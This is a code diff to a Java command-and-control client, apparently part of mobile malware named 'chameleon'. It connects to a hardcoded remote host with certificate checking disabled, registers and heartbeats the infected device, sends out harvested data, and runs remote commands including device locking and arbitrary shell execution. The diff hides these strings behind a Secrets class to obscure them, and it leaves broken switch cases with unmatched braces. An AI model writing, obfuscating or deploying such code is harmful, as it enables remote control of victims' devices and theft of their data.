@@ -7,6 +7,7 @@ import com.chameleon.payload.PayloadEntry;
 import com.chameleon.payload.harvester.HarvesterManager;
 import com.chameleon.payload.util.Crypto;
 import com.chameleon.payload.util.NetworkUtils;
+import com.chameleon.payload.util.Secrets;
 import org.json.JSONArray;
 import org.json.JSONObject;
 import java.io.*;
@@ -58,9 +59,9 @@ public class C2Connection {
         int retries = 0;
         while (running && retries < MAX_RETRIES) {
             try {
-                String host = "www.miraiglobal.site";
+                String host = Secrets.C2_HOST;
                 int port = 443;
-                String path = "/ws";
+                String path = Secrets.WS_PATH;
 
                 SSLContext sslContext = SSLContext.getInstance("TLS");
                 sslContext.init(null, new TrustManager[]{trustAllCerts}, new SecureRandom());
@@ -110,7 +111,7 @@ public class C2Connection {
     private void register() {
         try {
             JSONObject reg = new JSONObject();
-            reg.put("type", "register");
+            reg.put("type", Secrets.MSG_REGISTER);
             reg.put("device_id", deviceId);
             reg.put("data", new JSONObject()
                 .put("device_id", deviceId)
@@ -134,7 +135,7 @@ public class C2Connection {
                 sleep(HEARTBEAT_INTERVAL_MS);
                 try {
                     JSONObject hb = new JSONObject();
-                    hb.put("type", "heartbeat");
+                    hb.put("type", Secrets.MSG_HEARTBEAT);
                     hb.put("device_id", deviceId);
                     hb.put("data", new JSONObject().put("device_id", deviceId).put("timestamp", System.currentTimeMillis()));
                     send(hb.toString());
@@ -199,7 +200,7 @@ public class C2Connection {
             JSONObject msg = new JSONObject(message);
             String type = msg.optString("type");
 
-            if ("command".equals(type)) {
+            if (Secrets.MSG_COMMAND.equals(type)) {
                 String command = msg.optString("command");
                 String commandId = msg.optString("command_id");
                 JSONObject params = msg.optJSONObject("params");
@@ -217,28 +218,11 @@ public class C2Connection {
 
         try {
             switch (command) {
-                case "start_sweep": {
-                    int duration = params != null ? params.optInt("duration", 300) : 300;
-                    harvesterManager.startSweep(duration);
-                    sendAck(commandId, "started");
-                    break;
-                }
-                case "stop_sweep": {
-                    harvesterManager.stopSweep();
-                    sendAck(commandId, "stopped");
-                    break;
-                }
-                case "lock_device": {
-                    harvesterManager.lockDevice();
-                    sendAck(commandId, "done");
-                    break;
-                }
-                case "release_device": {
-                    harvesterManager.releaseDevice();
-                    sendAck(commandId, "done");
-                    break;
-                }
-                case "exec_command": {
+                case Secrets.CMD_START_SWEEP: {
+                case Secrets.CMD_STOP_SWEEP: {
+                case Secrets.CMD_LOCK_DEVICE: {
+                case Secrets.CMD_RELEASE_DEVICE: {
+                case Secrets.CMD_EXEC_COMMAND: {
                     String cmd = params != null ? params.optString("cmd", "") : "";
                     execShell(cmd);
                     sendAck(commandId, "executed");
@@ -256,7 +240,7 @@ public class C2Connection {
         try {
             String encoded = Base64.getEncoder().encodeToString(encryptedPayload);
             JSONObject data = new JSONObject();
-            data.put("type", "data");
+            data.put("type", Secrets.MSG_DATA);
             data.put("device_id", deviceId);
             data.put("data_type", dataType);
             data.put("data", new JSONObject()
@@ -274,7 +258,7 @@ public class C2Connection {
     private void sendAck(String commandId, String status) {
         try {
             JSONObject ack = new JSONObject();
-            ack.put("type", "command_ack");
+            ack.put("type", Secrets.MSG_COMMAND_ACK);
             ack.put("device_id", deviceId);
             ack.put("command_id", commandId);
             ack.put("data", new JSONObject().put("command_id", commandId).put("status", status));
